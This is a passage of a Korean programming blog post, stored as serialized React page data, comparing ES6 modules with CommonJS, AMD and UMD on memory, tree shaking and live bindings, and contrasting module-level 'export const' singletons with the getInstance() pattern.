관리\"}],[\"$\",\"td\",null,{\"children\":\"모듈 내부 정리만\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"값 공유 방식\"}]}],[\"$\",\"td\",null,{\"children\":\"값 복사\"}],[\"$\",\"td\",null,{\"children\":\"라이브 바인딩\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"메모리 효율성\"}]}],[\"$\",\"td\",null,{\"children\":\"낮음 (복사 오버헤드)\"}],[\"$\",\"td\",null,{\"children\":\"높음 (참조 공유)\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"런타임 성능\"}]}],[\"$\",\"td\",null,{\"children\":\"빠른 접근\"}],[\"$\",\"td\",null,{\"children\":\"약간의 오버헤드\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"Tree Shaking\"}]}],[\"$\",\"td\",null,{\"children\":\"어려움\"}],[\"$\",\"td\",null,{\"children\":\"우수함\"}]]}]]}]]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"📝 실무적 의미:\"}]}],\"\\n\",[\"$\",\"ol\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"ES6 모듈로 전환 시\"}],\" → \",[\"$\",\"code\",null,{\"children\":\"window.XXX = XXX\"}],\" 코드들을 제거할 수 있음\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"메모리 관리 단순화\"}],\" → 전역 등록 걱정 없이 모듈만 잘 설계하면 됨\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"하지만 책임 증가\"}],\" → 모듈 내부의 이벤트 리스너, 타이머 등은 여전히 정리해야 함\"]}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"ES6 모듈\"}],\"은 우수한 tree shaking 기능을 제공하여 프로덕션 빌드에서 번들 크기를 20-50% 줄입니다. 라이브 바인딩은 공유 값에 대한 더 나은 메모리 효율성을 가능하게 하지만, 속성 접근에 약간의 런타임 오버헤드가 있습니다. 정적 특성은 동적 시스템으로는 불가능한 빌드 타임 최적화를 허용합니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"CommonJS\"}],\"는 동기적 로딩 때문에 Node.js 환경에서 10-40% 더 빠른 시작을 보입니다. 하지만 값 복사는 더 높은 메모리 사용량을 야기하고, 정적 분석의 부족은 효과적인 데드 코드 제거를 방지합니다. Node.js에서는 require.cache를 수동으로 지울 수 있지만, 브라우저의 ES6 모듈에서는 불가능합니다.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"AMD와 UMD\"}],\" 패턴은 래퍼 함수와 로더 코드 때문에 더 높은 메모리 오버헤드를 가집니다. 비동기 브라우저 로딩을 위해 설계되었지만, ES6 모듈의 최적화 기회가 부족하고 점점 레거시 접근법으로 여겨집니다.\"]}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"메모리-누수-vs-의도된-싱글톤-패턴\",\"children\":\"메모리 누수 vs 의도된 싱글톤 패턴\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"메모리 누수와 의도된 지속성 사이의 구분이 중요합니다. 모듈 싱글톤 동작은 \",[\"$\",\"strong\",null,{\"children\":\"설계에 의한 것\"}],\"입니다 - 모듈은 import 간에 상태를 유지해야 합니다. 하지만 이는 여러 누수 패턴을 만듭니다:\"]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 의도된 싱글톤 패턴 - 좋음\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" instance \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword null nil\",\"children\":\"null\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"getInstance\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"if\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"!\"}],\"instance\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[\"    instance \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"ComplexClass\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"return\"}],\" instance\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"10\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 의도하지 않은 메모리 누수 - 나쁨\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"11\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" cache \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Map\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"process\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token parameter\",\"children\":\"data\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"13\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 캐시가 무한정 증가\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"14\",\"children\":[\"  cache\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"set\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token known-class-name class-name\",\"children\":\"Date\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"now\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\",\"}],\" data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"15\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"processData\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],\"data\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"16\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"h4\",null,{\"id\":\"es6-모듈의-간편한-싱글톤-패턴\",\"children\":\"ES6 모듈의 간편한 싱글톤 패턴\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"ES6 모듈에서는 전통적인 \",[\"$\",\"code\",null,{\"children\":\"getInstance()\"}],\" 패턴 대신 \",[\"$\",\"strong\",null,{\"children\":\"더 간단한 방식으로 싱글톤을 만들 수 있습니다\"}],\":\"]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 🟢 현대적인 ES6 모듈 싱글톤 (권장)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"ServiceManager\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"_ServiceManager\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"DatabasePool\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"ConnectionPool\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"Logger\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"AppLogger\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 🟡 전통적인 싱글톤 패턴 (여전히 유효하지만 더 복잡)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" instance \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword null nil\",\"children\":\"null\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"8\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"getInstance\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"9\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"if\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"!\"}],\"instance\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"10\",\"children\":[\"    instance \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"ComplexClass\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"11\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"12\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"return\"}],\" instance\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"13\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"⚡ 두 방식 모두 완전히 동일한 싱글톤 효과를 제공합니다!\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"ES6 모듈의 평가는 \",[\"$\",\"strong\",null,{\"children\":\"딱 한 번만 실행\"}],\"되므로:\"]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// service-manager.js\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token console class-name\",\"children\":\"console\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\".\"}],[\"$\",\"span\",null,{\"className\":\"token method function property-access\",\"children\":\"log\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'모듈 평가 실행!'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 첫 import에서만 실행됨\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"const\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"ServiceManager\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"_ServiceManager\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// ↑ 이 라인도 딱 한 번만 실행됨!\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 여러 곳에서 import해도 모두 동일한 인스턴스\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token imports\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"ServiceManager\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}]]}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"from\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./service-manager.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 평가 실행\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token imports\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"ServiceManager\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}]]}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"from\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./service-manager.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 캐시에서 반환\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"import\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token imports\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token maybe-class-name\",\"children\":\"ServiceManager\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"}\"}]]}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"from\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token string\",\"children\":\"'./service-manager.js'\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"  \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 캐시에서 반환\"}],\"\\n\"]}]]}]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"📊 두 패턴 비교\"}]}],\"\\n\",[\"$\",\"table\",null,{\"children\":[[\"$\",\"thead\",null,{\"children\":[\"$\",\"tr\",null,{\"children\":[[\"$\",\"th\",null,{\"children\":\"측면\"}],[\"$\",\"th\",null,{\"children\":[[\"$\",\"code\",null,{\"children\":\"export const\"}],\" 방식\"]}],[\"$\",\"th\",null,{\"children\":[[\"$\",\"code\",null,{\"children\":\"getInstance()\"}],\" 방식\"]}]]}]}],[\"$\",\"tbody\",null,{\"children\":[[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"싱글톤 보장\"}]}],[\"$\",\"td\",null,{\"children\":\"✅ 동일함\"}],[\"$\",\"td\",null,{\"children\":\"✅ 동일함\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"지연 초기화\"}]}],[\"$\",\"td\",null,{\"children\":\"❌ 즉시 생성\"}],[\"$\",\"td\",null,{\"children\":\"✅ 첫 호출 시 생성\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"코드 간결성\"}]}],[\"$\",\"td\",null,{\"children\":\"✅ 매우 간단\"}],[\"$\",\"td\",null,{\"children\":\"❌ 더 복잡\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"TypeScript 지원\"}]}],[\"$\",\"td\",null,{\"children\":\"✅ 우수함\"}],[\"$\",\"td\",null,{\"children\":\"✅ 우수함\"}]]}],[\"$\",\"tr\",null,{\"children\":[[\"$\",\"td\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"메모리 사용\"}]}],[\"$\",\"td\",null,{\"children\":\"즉시 할당\"}],[\"$\",\"td\",null,{\"children\":\"필요시 할당\"}]]}]]}]]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":\"🎯 언제 어떤 방식을 사용할까?\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":[\"✅ \",[\"$\",\"code\",null,{\"children\":\"export const\"}],\" 방식 (대부분의 경우 권장):\"]}]}],\"\\n\",[\"$\",\"ul\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":\"코드가 간결하고 명확\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"일반적인 싱글톤 패턴\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"TypeScript에서 타입 추론 우수\"}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"strong\",null,{\"children\":[\"🔄 \",[\"$\",\"code\",null,{\"children\":\"getInstance()\"}],\" 방식이 필요한 경우:\"]}]}],\"\\n\",[\"$\",\"div\",null,{\"className\":\"code-block-wrapper my-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"language-javascript code-highlight\",\"data-language\":\"javascript\",\"children\":[\"$\",\"code\",null,{\"className\":\"language-javascript code-highlight\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"1\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 무거운 초기화나 조건부 생성이 필요한 경우만\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"2\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"let\"}],\" databaseConnection \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword null nil\",\"children\":\"null\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"3\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token keyword module\",\"children\":\"export\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token function\",\"children\":\"getDatabaseConnection\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"4\",\"children\":[\"  \",[\"$\",\"span\",null,{\"className\":\"token keyword control-flow\",\"children\":\"if\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"!\"}],\"databaseConnection\",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\")\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"5\",\"children\":[\"    \",[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// 무거운 초기화 작업\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"6\",\"children\":[\"    databaseConnection \",[\"$\",\"span\",null,{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token keyword\",\"children\":\"new\"}],\" \",[\"$\",\"span\",null,{\"className\":\"token class-name\",\"children\":\"Database\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",null,{\"className\":\"token punctuation\",\"children\":\"{\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line line-number\",\"line\":\"7\",\"children\":[\"      \",[\"$\",\"span\",null,{\"className\":\"token literal-property 